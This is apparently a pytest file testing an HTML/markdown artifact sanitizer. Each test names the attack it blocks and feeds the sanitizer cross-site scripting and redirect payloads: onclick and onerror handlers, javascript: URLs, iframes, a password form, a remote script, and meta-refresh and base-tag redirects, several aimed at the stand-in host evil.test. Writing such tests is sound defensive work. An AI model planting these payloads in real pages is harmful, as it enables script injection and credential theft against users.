"""Artifact sanitization — the security boundary.

Each test names the attack it prevents, because a security test whose purpose is
unclear gets deleted the first time it becomes inconvenient.
"""

from app.security import sanitize_artifact


def test_inline_event_handlers_are_stripped():
    """Prevents: arbitrary JS executing on user interaction with the artifact."""
    clean, report = sanitize_artifact(
        '<div onclick="fetch(\'//evil.test\')">click</div>', "html"
    )
    assert "onclick" not in clean.lower()
    assert "div[onclick]" in report.removed_attributes


def test_onerror_on_image_is_stripped():
    """Prevents: the most common XSS payload, which needs no user interaction."""
    clean, _ = sanitize_artifact('<img src=x onerror="alert(1)">', "html")
    assert "onerror" not in clean.lower()


def test_javascript_url_scheme_is_blocked():
    clean, report = sanitize_artifact('<a href="javascript:alert(1)">x</a>', "html")
    assert "javascript:" not in clean.lower()
    assert report.blocked_urls


def test_nested_iframe_is_removed_with_its_contents():
    """Prevents: frame-busting and UI redress attacks against the host app."""
    clean, report = sanitize_artifact(
        '<div>keep<iframe src="//evil.test"><p>drop</p></iframe></div>', "html"
    )
    assert "iframe" not in clean.lower()
    assert "drop" not in clean
    assert "keep" in clean
    assert "iframe" in report.removed_elements


def test_form_is_removed_to_prevent_credential_harvesting():
    clean, report = sanitize_artifact(
        '<form action="//evil.test"><input name="password"></form>', "html"
    )
    assert "<form" not in clean.lower()
    assert "form" in report.removed_elements


def test_remote_script_src_is_blocked_but_inline_script_is_kept():
    """Inline scripts make artifacts interactive; the iframe sandbox contains them.
    Remote scripts are unreviewable and are blocked at both layers."""
    clean, report = sanitize_artifact(
        '<script src="https://evil.test/x.js"></script>'
        "<script>document.title='ok'</script>",
        "html",
    )
    assert "evil.test" not in clean
    assert "document.title" in clean
    assert report.inline_scripts_kept == 1


def test_meta_refresh_redirect_is_removed():
    clean, _ = sanitize_artifact(
        '<meta http-equiv="refresh" content="0;url=//evil.test">', "html"
    )
    assert "http-equiv" not in clean.lower()


def test_base_tag_is_removed():
    """Prevents: rewriting every relative URL in the artifact to an attacker host."""
    clean, report = sanitize_artifact('<base href="//evil.test/">', "html")
    assert "<base" not in clean.lower()
    assert "base" in report.removed_elements


def test_safe_markup_passes_through_unchanged_and_reports_clean():
    src = '<div class="card"><h1>Activation</h1><p>Retention flattens.</p></div>'
    clean, report = sanitize_artifact(src, "html")
    assert "Activation" in clean and "card" in clean
    assert report.clean


def test_html_embedded_in_markdown_is_also_sanitized():
    clean, _ = sanitize_artifact(
        "# Title\n\n<img src=x onerror=alert(1)>\n\nBody text.", "markdown"
    )
    assert "onerror" not in clean.lower()
    assert "# Title" in clean


def test_oversized_artifact_is_truncated_not_rejected():
    clean, report = sanitize_artifact("<p>" + "x" * 900_000 + "</p>", "html")
    assert report.truncated
    assert len(clean) < 900_000


def test_malformed_markup_does_not_raise():
    clean, report = sanitize_artifact("<div><p>unclosed<<<>>", "html")
    assert isinstance(clean, str)
    assert isinstance(report.to_dict(), dict)


def test_report_serialises_for_the_ui():
    _, report = sanitize_artifact('<iframe></iframe><div onclick="x()"></div>', "html")
    d = report.to_dict()
    assert d["clean"] is False
    assert "iframe" in d["removed_elements"]
    assert isinstance(d["notes"], list) and d["notes"]
